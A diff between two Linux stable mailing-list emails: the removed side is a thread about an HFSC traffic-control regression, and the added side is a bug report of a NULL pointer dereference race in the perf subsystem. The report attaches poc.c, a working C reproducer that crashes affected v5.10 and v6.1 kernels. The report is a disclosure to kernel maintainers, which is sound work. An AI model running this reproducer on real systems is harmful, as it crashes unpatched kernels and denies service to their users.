@@ -2,168 +2,223 @@ Return-Path: <stable-owner@vger.kernel.org>
 X-Original-To: lists+stable@lfdr.de
 Delivered-To: lists+stable@lfdr.de
 Received: from out1.vger.email (out1.vger.email [IPv6:2620:137:e000::1:20])
-	by mail.lfdr.de (Postfix) with ESMTP id 265667BC497
-	for <lists+stable@lfdr.de>; Sat,  7 Oct 2023 06:11:14 +0200 (CEST)
+	by mail.lfdr.de (Postfix) with ESMTP id 75E907BC4E2
+	for <lists+stable@lfdr.de>; Sat,  7 Oct 2023 07:48:08 +0200 (CEST)
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S234043AbjJGELJ (ORCPT <rfc822;lists+stable@lfdr.de>);
-        Sat, 7 Oct 2023 00:11:09 -0400
-Received: from lindbergh.monkeyblade.net ([23.128.96.19]:38722 "EHLO
+        id S1343542AbjJGFsG (ORCPT <rfc822;lists+stable@lfdr.de>);
+        Sat, 7 Oct 2023 01:48:06 -0400
+Received: from lindbergh.monkeyblade.net ([23.128.96.19]:34504 "EHLO
         lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S229510AbjJGELI (ORCPT
-        <rfc822;stable@vger.kernel.org>); Sat, 7 Oct 2023 00:11:08 -0400
-Received: from mail.flyingcircus.io (mail.flyingcircus.io [212.122.41.197])
-        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 5139CBE;
-        Fri,  6 Oct 2023 21:11:06 -0700 (PDT)
-Content-Type: text/plain;
-        charset=utf-8
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=flyingcircus.io;
-        s=mail; t=1696651863;
-        bh=Sze3HJLbn7xdtgjzi29J/nVOnk5kP/6WiEVjB+3iJxI=;
-        h=Subject:From:In-Reply-To:Date:Cc:References:To;
-        b=liIlPkM8z2giTnNMwT+WR9Do9o/z0Jg2MAr/Ol4PGYnKxcNImres49KQHmBL6bJBO
-         yZu+Me6LbkNL1nAuylr4UZvqfs7yIxyK9v/BqmUHSfZS8nZ7jPAiGP4K3EC1cO5LCr
-         k+9zC+cL2hoYqdoa5iZlEu7ei7DAsxfsvtJ7yF8A=
-Mime-Version: 1.0 (Mac OS X Mail 16.0 \(3731.700.6\))
-Subject: Re: [REGRESSION] Userland interface breaks due to hard HFSC_FSC
- requirement
-From:   Christian Theune <ct@flyingcircus.io>
-In-Reply-To: <065a0dac-499f-7375-ddb4-1800e8ef61d1@mojatatu.com>
-Date:   Sat, 7 Oct 2023 06:10:42 +0200
-Cc:     stable@vger.kernel.org, netdev@vger.kernel.org,
-        Linux regressions mailing list <regressions@lists.linux.dev>,
-        davem@davemloft.net, edumazet@google.com, kuba@kernel.org,
-        pabeni@redhat.com
-Content-Transfer-Encoding: quoted-printable
-Message-Id: <0BC2C22C-F9AA-4B13-905D-FE32F41BDA8A@flyingcircus.io>
-References: <297D84E3-736E-4AB4-B825-264279E2043C@flyingcircus.io>
- <065a0dac-499f-7375-ddb4-1800e8ef61d1@mojatatu.com>
-To:     Pedro Tammela <pctammela@mojatatu.com>
+        with ESMTP id S233675AbjJGFsF (ORCPT
+        <rfc822;stable@vger.kernel.org>); Sat, 7 Oct 2023 01:48:05 -0400
+Received: from mail-pj1-x1029.google.com (mail-pj1-x1029.google.com [IPv6:2607:f8b0:4864:20::1029])
+        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id D70D0BB;
+        Fri,  6 Oct 2023 22:48:04 -0700 (PDT)
+Received: by mail-pj1-x1029.google.com with SMTP id 98e67ed59e1d1-2777a5e22b5so2247554a91.1;
+        Fri, 06 Oct 2023 22:48:04 -0700 (PDT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20230601; t=1696657684; x=1697262484; darn=vger.kernel.org;
+        h=content-disposition:mime-version:message-id:subject:to:from:date
+         :from:to:cc:subject:date:message-id:reply-to;
+        bh=a8APydBzGmBAWd7VQe5JSgUK5E2jWt6CWbg4P3bjY5w=;
+        b=kIsurnQV+mUP9WQ+nNVVt43SB0KTPhSifBEogknBAR/HSMjo0sy+aG/7ADM6Y+JEwv
+         gzT21nq5Qarz2iOsj83ZMWY48VH7TCsB9JvaGbCPHWr16FpouiRRF1gGXM7gwdg2bT2D
+         TJx1W3JvcRph3QQRryPnKYS1gR28hTPjz7OnJUavH9Kx78GnTSI5CvcEvaewqYNAeG7v
+         GKxxI+vSTk9Um5GopQgWi73g8RwoBNds+AchFg0p64ayn0cdSmk9OHr4RUR77OLl/wdN
+         beXhR84e94rP8nmoyBp5bC5Qz4aFWPdMASnXQkHYJMqETFCtOa3ovX5MZToGy8dFvkso
+         vU7A==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20230601; t=1696657684; x=1697262484;
+        h=content-disposition:mime-version:message-id:subject:to:from:date
+         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
+        bh=a8APydBzGmBAWd7VQe5JSgUK5E2jWt6CWbg4P3bjY5w=;
+        b=Z9eoiuMpAOqvR1P7YNsOpyJVsnwsZdgzGjOXazB6HkqZ2F/Rd8ZMtX9jwFOPxQp7wS
+         UQTWCcoIFzSJ2tVx0kQRgS2weCDvo5lll6et8IXZCEoDU5ZfTtfRVvFGQHIByxAuAh0Z
+         YhYAkkWkaBp9onjjqt9eVZcu3lhD3yZOHJIjl61GfCHqKWslPWq3ZJ5ZXlZp+G39HefD
+         aWp2lXfCpRJO48CqxZ07uHJkr2yrISFthqxOlRPx8DQZ6DbFOQFjVx1gwh5oTtuK5Crj
+         b8Vqd1BL2JGhPumf02sxhSYJqcUTsVjgP25w/H5uzNvRSs7GUT3zPxrm07ctb8LhFDJw
+         8Mdw==
+X-Gm-Message-State: AOJu0YyvXkexjgI7Ub6LwUlh4yDXrfF3RpO0cgbd4wTLsu8Ju2NDCbgo
+        BThhOroBAoQ4bO9NuOZsI6diD0HjxNjL8u6J
+X-Google-Smtp-Source: AGHT+IFZUP0Yvt395+U2TSgvQ2D1Xv8KVNhED3yzLpKI4j/hEJbOW/DP/3cHWslT1Ec+7ExtqgRrZw==
+X-Received: by 2002:a17:902:e84d:b0:1c5:ec97:1718 with SMTP id t13-20020a170902e84d00b001c5ec971718mr11084356plg.6.1696657683763;
+        Fri, 06 Oct 2023 22:48:03 -0700 (PDT)
+Received: from westworld ([2a00:79e1:abc:f604:65ef:3071:e2b0:2c11])
+        by smtp.gmail.com with ESMTPSA id iw7-20020a170903044700b001c5f62a639asm4902785plb.196.2023.10.06.22.48.00
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Fri, 06 Oct 2023 22:48:02 -0700 (PDT)
+Date:   Fri, 6 Oct 2023 22:47:57 -0700
+From:   Kyle Zeng <zengyhkyle@gmail.com>
+To:     linux-kernel@vger.kernel.org, stable@vger.kernel.org
+Subject: nullptr-deference in perf
+Message-ID: <ZSDxDZR5hoaKTCdP@westworld>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="IS/x4giOAnmQGjnO"
+Content-Disposition: inline
 X-Spam-Status: No, score=-2.1 required=5.0 tests=BAYES_00,DKIM_SIGNED,
-        DKIM_VALID,DKIM_VALID_AU,DKIM_VALID_EF,RCVD_IN_DNSWL_BLOCKED,
-        SPF_HELO_NONE,SPF_PASS autolearn=ham autolearn_force=no version=3.4.6
+        DKIM_VALID,DKIM_VALID_AU,DKIM_VALID_EF,FREEMAIL_FROM,
+        RCVD_IN_DNSWL_NONE,SPF_HELO_NONE,SPF_PASS autolearn=ham
+        autolearn_force=no version=3.4.6
 X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on
         lindbergh.monkeyblade.net
 Precedence: bulk
 List-ID: <stable.vger.kernel.org>
 X-Mailing-List: stable@vger.kernel.org
 
-Hi,
 
-> On 7. Oct 2023, at 00:12, Pedro Tammela <pctammela@mojatatu.com> =
-wrote:
->=20
-> On 06/10/2023 05:37, Christian Theune wrote:
->> Hi,
->> (prefix, I was not aware of the regression reporting process and =
-incorrectly reported this informally with the developers mentioned in =
-the change)
->> I upgraded from 6.1.38 to 6.1.55 this morning and it broke my traffic =
-shaping script, leaving me with a non-functional uplink on a remote =
-router.
->> The script errors out like this:
->> Oct 06 05:49:22 wendy00 isp-setup-shaping-start[2053]: + ext=3DispA
->> Oct 06 05:49:22 wendy00 isp-setup-shaping-start[2053]: + =
-ext_ingress=3Difb0
->> Oct 06 05:49:22 wendy00 isp-setup-shaping-start[2053]: + modprobe ifb
->> Oct 06 05:49:22 wendy00 isp-setup-shaping-start[2053]: + modprobe =
-act_mirred
->> Oct 06 05:49:22 wendy00 isp-setup-shaping-start[2053]: + tc qdisc del =
-dev ispA root
->> Oct 06 05:49:22 wendy00 isp-setup-shaping-start[2061]: Error: Cannot =
-delete qdisc with handle of zero.
->> Oct 06 05:49:22 wendy00 isp-setup-shaping-start[2053]: + true
->> Oct 06 05:49:22 wendy00 isp-setup-shaping-start[2053]: + tc qdisc del =
-dev ispA ingress
->> Oct 06 05:49:22 wendy00 isp-setup-shaping-start[2064]: Error: Cannot =
-find specified qdisc on specified device.
->> Oct 06 05:49:22 wendy00 isp-setup-shaping-start[2053]: + true
->> Oct 06 05:49:22 wendy00 isp-setup-shaping-start[2053]: + tc qdisc del =
-dev ifb0 root
->> Oct 06 05:49:22 wendy00 isp-setup-shaping-start[2066]: Error: Cannot =
-delete qdisc with handle of zero.
->> Oct 06 05:49:22 wendy00 isp-setup-shaping-start[2053]: + true
->> Oct 06 05:49:22 wendy00 isp-setup-shaping-start[2053]: + tc qdisc del =
-dev ifb0 ingress
->> Oct 06 05:49:22 wendy00 isp-setup-shaping-start[2067]: Error: Cannot =
-find specified qdisc on specified device.
->> Oct 06 05:49:22 wendy00 isp-setup-shaping-start[2053]: + true
->> Oct 06 05:49:22 wendy00 isp-setup-shaping-start[2053]: + tc qdisc add =
-dev ispA handle ffff: ingress
->> Oct 06 05:49:22 wendy00 isp-setup-shaping-start[2053]: + ifconfig =
-ifb0 up
->> Oct 06 05:49:22 wendy00 isp-setup-shaping-start[2053]: + tc filter =
-add dev ispA parent ffff: protocol all u32 match u32 0 0 action mirred =
-egress redirect dev ifb0
->> Oct 06 05:49:22 wendy00 isp-setup-shaping-start[2053]: + tc qdisc add =
-dev ifb0 root handle 1: hfsc default 1
->> Oct 06 05:49:22 wendy00 isp-setup-shaping-start[2053]: + tc class add =
-dev ifb0 parent 1: classid 1:999 hfsc rt m2 2.5gbit
->> Oct 06 05:49:22 wendy00 isp-setup-shaping-start[2053]: + tc class add =
-dev ifb0 parent 1:999 classid 1:1 hfsc sc rate 50mbit
->> Oct 06 05:49:22 wendy00 isp-setup-shaping-start[2077]: Error: Invalid =
-parent - parent class must have FSC.
->> The error message is also a bit weird (but that=E2=80=99s likely due =
-to iproute2 being weird) as the CLI interface for `tc` and the error =
-message do not map well. (I think I would have to choose `hfsc sc` on =
-the parent to enable the FSC option which isn=E2=80=99t mentioned =
-anywhere in the hfsc manpage).
->> The breaking change was introduced in 6.1.53[1] and a multitude of =
-other currently supported kernels:
->=20
-> Hi,
->=20
-> Your script is actually incorrect.
-> `man 7 tc-hfsc` goes in depth into why, but I just wanna highlight =
-this section:
-> SEPARATE LS / RT SCs
->       Another difference from the original HFSC paper is that RT and =
-LS SCs can be specified separately. Moreover, leaf classes are
->       allowed to have only either RT SC or LS SC. For interior =
-classes, only LS SCs make sense: any RT SC will be ignored.
->=20
-> The last part ("For interior classes...") was what the referenced =
-patch fixed. We were mistakenly allowing RTs into "interior classes" =
-which the implementation never accounted for and this was a source of =
-crashes. I'm surprised you were lucky enough to never crash the kernel =
-;)
-> -=3D
-> I believe the script could be updated to the following and still =
-achieve the same results:
-> tc class add dev ifb0 parent 1: classid 1:999 hfsc ls m2 2.5gbit
-> tc class add dev ifb0 parent 1:999 classid 1:1 hfsc rt rate 50mbit
+--IS/x4giOAnmQGjnO
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
 
-I=E2=80=99m absolutely with you on this point and I=E2=80=99m very sure =
-that I may have gotten the configuration wrong. I was already diving =
-into fixing the script. Nevertheless, this end of the system is =
-definitely not my strongest discipline and I tried get it right when =
-setting this up initially scrambling through the man pages and the =
-complexities of this topic. Unfortunately trying to learn this stuff is =
-really hard and if the system finally accepts your config and does what =
-you want and doesn=E2=80=99t complain in any way, then it=E2=80=99s hard =
-to try and track down whether anything else could have been missed - =
-somewhat a case of the halting problem. ;)
+Hi there,
 
-Point in case: I didn=E2=80=99t even notice tc-hfsc(7) was there and =
-that I was only reading tc-hfsc(8).=20
+I found a nullptr dereference in perf subsystem and it affects at least
+v5.10 and v6.1 stable trees. (the same poc cannot trigger the crash in
+the mainline).
 
-Nevertheless, I=E2=80=99m curious and registered this as a regression, =
-because it seems to fit the description and broke a running system. =
-Looking at the change I=E2=80=99m wondering whether the kernel stability =
-rule implies that the change has to be more forgiving towards user land, =
-even if the user(land) might be wrong?=20
+I fail to find the root cause the bug. All I know is that it is a race
+condition in the logic of moving_groups from pure software-based perf
+events to hardware ones. More specifically, when we add a hardware perf
+event to a software event group, it will trigger a "move_group" logic in
+perf_event_open. When the "move_group" logic happens, it will remove all
+existing events from the context first using `perf_remove_from_context`.
+And it will invoke `__perf_remove_from_context` through
+`event_function_call`.
 
-The idea of not bricking your system by upgrading the Linux kernel seems =
-to apply here. IMHO the change could maybe done in a way that keeps the =
-system running but informs the user that something isn=E2=80=99t working =
-as intended?
+Notice that `event_function_call` is defined as follow:
+~~~
+static void event_function_call(struct perf_event *event, event_f func, void *data)
+{
+	...
+	func(event, NULL, ctx, data);
+	...
+}
+~~~
+This means `__perf_remove_from_context` will be invoked with
+cpuctx==NULL, which leads to invoking `event_sched_out` with cpuctx ==
+NULL.
+At this moment, as long as the event is active, we are going to invoke
+the `if (event->attr.exclusive || !cpuctx->active_oncpu)` logic, which
+is a null pointer deference.
 
-Liebe Gr=C3=BC=C3=9Fe,
-Christian Theune
+I don't know the proper way to patch this bug. So I'm asking for help.
 
---=20
-Christian Theune =C2=B7 ct@flyingcircus.io =C2=B7 +49 345 219401 0
-Flying Circus Internet Operations GmbH =C2=B7 https://flyingcircus.io
-Leipziger Str. 70/71 =C2=B7 06108 Halle (Saale) =C2=B7 Deutschland
-HR Stendal HRB 21169 =C2=B7 Gesch=C3=A4ftsf=C3=BChrer: Christian Theune, =
-Christian Zagrodnick
+A reproducer is attached to this email.
 
+Best,
+Kyle Zeng
+
+--IS/x4giOAnmQGjnO
+Content-Type: text/x-csrc; charset=us-ascii
+Content-Disposition: attachment; filename="poc.c"
+
+#define _GNU_SOURCE 
+
+#include <dirent.h>
+#include <endian.h>
+#include <errno.h>
+#include <fcntl.h>
+#include <pthread.h>
+#include <signal.h>
+#include <stdarg.h>
+#include <stdbool.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/prctl.h>
+#include <sys/stat.h>
+#include <sys/syscall.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <time.h>
+#include <unistd.h>
+#include <assert.h>
+#include <linux/perf_event.h>
+
+#include <linux/futex.h>
+
+int pid;
+int group_fd;
+
+void context_setup()
+{
+	int ret;
+	struct perf_event_attr attr = {0};
+
+	pid = getpid();
+	
+	attr.type = PERF_TYPE_SOFTWARE;
+	attr.config = PERF_COUNT_SW_CPU_CLOCK;
+	attr.size = sizeof(attr);
+	attr.exclude_kernel = 1;
+
+	group_fd = syscall(__NR_perf_event_open, &attr, pid, 0, -1, 0); // group_fd = -1
+//	printf("group_fd: %d\n", group_fd);
+	assert(group_fd != -1);
+	//set_cpu(0);
+}
+
+void *func1(void *arg)
+{
+	//set_cpu(2);
+	struct perf_event_attr attr = {.size = sizeof(attr)};
+
+	attr.type = PERF_TYPE_SOFTWARE;
+	attr.config = PERF_COUNT_SW_CPU_CLOCK;
+	attr.exclude_kernel = 1;
+
+	for(int i = 0; i < 0x20; i++)
+		syscall(__NR_perf_event_open, &attr, pid, 0, group_fd, 0);
+}
+
+void *func2(void *arg)
+{
+	//set_cpu(1);
+	struct perf_event_attr attr = {.size = sizeof(attr)};
+
+	attr.type = PERF_TYPE_HARDWARE;
+	attr.config = PERF_COUNT_HW_CPU_CYCLES;
+	attr.exclude_kernel = 1;
+
+	syscall(__NR_perf_event_open, &attr, pid, 0, group_fd, 0);
+}
+
+void execute_two()
+{
+	pthread_t tid1, tid2;
+
+	pthread_create(&tid1, NULL, func1, NULL);
+	pthread_create(&tid2, NULL, func2, NULL);
+
+//	set_cpu(0);
+
+	pthread_join(tid1, NULL);
+	pthread_join(tid2, NULL);
+}
+
+static void loop(void)
+{
+	while(1) {
+		if(!fork()) {
+			context_setup();
+			execute_two();
+			exit(0);
+		}
+		wait(NULL);
+	}
+}
+
+
+int main(void)
+{
+	for(int i=0; i<16; i++) {
+		if(!fork()) {
+			loop();
+		}
+	}
+	sleep(100000000);
+	return 0;
+}
+
+--IS/x4giOAnmQGjnO--
